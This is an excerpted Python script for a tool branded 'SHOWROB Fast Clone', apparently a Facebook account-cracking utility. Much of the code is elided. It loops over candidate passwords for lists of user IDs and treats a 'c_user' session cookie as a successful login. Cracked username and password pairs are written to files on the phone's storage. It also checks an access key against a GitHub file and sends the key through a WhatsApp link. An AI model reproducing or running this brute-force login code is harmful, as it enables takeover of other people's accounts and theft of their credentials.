...
def main_apv():
    ...
    r1=requests.get("https://github.com/Showrob404/FASTCRACK/blob/main/z.txt").text
    ...
    if key1 in r1:
        ...
        os.system('am start https://wa.me/01923271418?text=' + tks)
...
........:::..:::::..::........:::.......::::......:::..:::::..:::::
 ...
 [$]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~[$]
    ...
    Facebook : https://www.facebook.com/Hate.ur.mind
...
def R():
			...
			print ("\033[1m [!] Tool    : SHOWROB Fast Clone")

			print (" [!] Brand   : SHOWROB-CYBER")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[SHOWROB TM]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Showrob-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/Showrob_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/Showrob_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print("\033[1;32m      SHOWROB-CYBER😊 \033[1;37m")
            ...
            print("\033[1;32m      Dont Forget Showrob-Cyber😊 \033[1;37m")
